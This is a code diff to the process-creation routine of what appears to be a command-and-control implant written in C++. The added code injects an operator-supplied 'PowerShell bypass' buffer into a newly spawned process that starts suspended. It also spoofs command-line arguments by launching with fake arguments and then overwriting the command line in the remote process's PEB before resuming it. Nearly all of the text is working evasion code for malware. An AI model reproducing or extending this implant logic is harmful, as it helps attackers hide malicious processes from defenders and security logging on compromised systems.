@@ -32,18 +32,27 @@ auto DECLFN Process::Create(
     _In_  ULONG                PsFlags,
     _Out_ PPROCESS_INFORMATION PsInfo
 ) -> BOOL {
-    BOOL   Success      = FALSE;
-    ULONG  TmpValue     = 0;
-    HANDLE PipeWrite    = nullptr;
-    HANDLE PipeDuplic   = nullptr;
-    HANDLE PipeRead     = nullptr;
-    HANDLE PsHandle     = nullptr;
-    BYTE*  PipeBuff     = nullptr;
-    ULONG  PipeBuffSize = 0;
-    UINT8  UpdateCount  = 0;
+    BOOL   Success       = FALSE;
+    ULONG  TmpValue      = 0;
+    HANDLE PipeWrite     = nullptr;
+    HANDLE PipeDuplic    = nullptr;
+    HANDLE PipeRead      = nullptr;
+    HANDLE PsHandle      = nullptr;
+    BYTE*  PipeBuff      = nullptr;
+    ULONG  PipeBuffSize  = 0;
+    UINT8  UpdateCount   = 0;
+    WCHAR* CmdLineBackup = CommandLine;
+    
+    BOOL    PwshCommand   = ( Self->Jbs->CurrentSubId == Enm::Ps::Pwsh );
+    INJ_OBJ Object        = { 0 };
+
+    ULONG   PwshBypassLen  = 0;
+    PBYTE   PwshBypassBuff = nullptr;
 
     ULONG BypassSize  = 0;
     PBYTE BypassBuff  = nullptr;
+
+    PROCESS_BASIC_INFORMATION PsBasic = { 0 };
 
     LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff = nullptr;
     UPTR                         AttrSize;
@@ -51,13 +60,15 @@ auto DECLFN Process::Create(
     STARTUPINFOEXW      SiEx         = { 0 };
     SECURITY_ATTRIBUTES SecurityAttr = { sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };
 
+    if ( PwshCommand ) { PwshBypassBuff = Self->Psr->Bytes( G_PARSER, &PwshBypassLen ); }
+
     if ( Self->Config.Ps.BlockDlls ) { UpdateCount++; };
     if ( Self->Config.Ps.ParentID  ) { UpdateCount++; };
 
     SiEx.StartupInfo.cb          = sizeof( STARTUPINFOEXW );
     SiEx.StartupInfo.wShowWindow = SW_HIDE;
 
-    PsFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
+    PsFlags |= EXTENDED_STARTUPINFO_PRESENT;
 
     auto Cleanup = [&]( VOID ) -> BOOL {
         if ( AttrBuff  ) { 
@@ -74,7 +85,7 @@ auto DECLFN Process::Create(
     if ( UpdateCount ) {
         Self->Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
         AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)hAlloc( AttrSize );
-        Success = Self->Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
+        Success  = Self->Krnl32.InitializeProcThreadAttributeList( AttrBuff, UpdateCount, 0, &AttrSize );
         if ( ! Success ) { return Cleanup(); }
     }
 
@@ -121,14 +132,65 @@ auto DECLFN Process::Create(
             SiEx.StartupInfo.hStdOutput = PipeWrite;
         }
     }
+
+    if ( Self->Config.Ps.SpoofArg ) {
+        KH_DBG_MSG
+        if ( Str::LengthW( CommandLine ) > Str::LengthW( Self->Config.Ps.SpoofArg ) ) {
+            QuickMsg( "Spoofed Arguments must be smaller then Legit Command Line: %s", CommandLine );
+            return Cleanup();
+        }
+        
+        CommandLine = Self->Config.Ps.SpoofArg;
+    }
+
+    if ( PwshBypassLen || Self->Config.Ps.SpoofArg ) PsFlags |= CREATE_SUSPENDED;
     
     Success = Self->Krnl32.CreateProcessW(
-        nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
+        nullptr, CommandLine, nullptr, nullptr, InheritHandles, PsFlags,
         nullptr, Self->Config.Ps.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
+
     if ( ! Success ) { 
         return Cleanup(); 
     }
+
+    if ( PwshBypassLen ) {
+        Object.PsHandle = PsInfo->hProcess;
+        Self->Inj->Main( PwshBypassBuff, PwshBypassLen, nullptr, 0, &Object );   
+    }
+
+    if ( Self->Config.Ps.SpoofArg && PwshBypassLen ) {
+        if ( Self->Ntdll.NtQueryInformationProcess( PsInfo->hProcess, ProcessBasicInformation, &PsBasic, sizeof( PsBasic ), &TmpValue ) ) {
+            return Cleanup();
+        }
+
+        PEB*   PebBuff   = (PEB*)hAlloc( sizeof( PEB ) );
+        PVOID  ParamBuff = hAlloc( sizeof( RTL_USER_PROCESS_PARAMETERS ) );
+        SIZE_T OperatBts = 0;
+
+        if ( Self->Mm->Read( PsBasic.PebBaseAddress, (PBYTE)PebBuff, sizeof( PEB ), &OperatBts, PsInfo->hProcess ) ) {
+            hFree( PebBuff   );
+            hFree( ParamBuff );
+            return Cleanup();
+        }
+
+        if ( Self->Mm->Read( PebBuff->ProcessParameters, (PBYTE)ParamBuff, sizeof( RTL_USER_PROCESS_PARAMETERS ) + 0xFF, &OperatBts, PsInfo->hProcess ) ) {
+            hFree( PebBuff   );
+            hFree( ParamBuff );
+            return Cleanup();
+        }
+
+        if ( Self->Mm->Write( static_cast<RTL_USER_PROCESS_PARAMETERS*>( ParamBuff )->CommandLine.Buffer, (PBYTE)CmdLineBackup, Str::LengthW( CmdLineBackup ) + 1, &OperatBts, PsInfo->hProcess ) ) {
+            hFree( PebBuff   );
+            hFree( ParamBuff );
+            return Cleanup();
+        }
+
+        hFree( PebBuff   );
+        hFree( ParamBuff );
+    }
+
+    if ( Self->Config.Ps.SpoofArg || PwshBypassLen ) Self->Krnl32.ResumeThread( PsInfo->hThread );
 
     if ( PipeWrite ) {
         Self->Ntdll.NtClose( PipeWrite );
@@ -136,7 +198,7 @@ auto DECLFN Process::Create(
     }
 
     if ( Self->Config.Ps.Pipe ) {
-        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, INFINITE );
+        DWORD waitResult = Self->Krnl32.WaitForSingleObject( PsInfo->hProcess, 5000 );
         
         if ( waitResult == WAIT_OBJECT_0 ) {
             Success = Self->Krnl32.PeekNamedPipe(
@@ -155,8 +217,7 @@ auto DECLFN Process::Create(
                         Self->Ps->Out.p = PipeBuff;
                         Self->Ps->Out.s = TmpValue;
                         
-                        KhDbg( "Process output: %d bytes", TmpValue );
-                        KhDbg( "Output: %s", PipeBuff );
+                        KhDbg( "Output: [%d] %s", TmpValue, PipeBuff );
                     } else {
                         hFree( PipeBuff );
                         PipeBuff = nullptr;
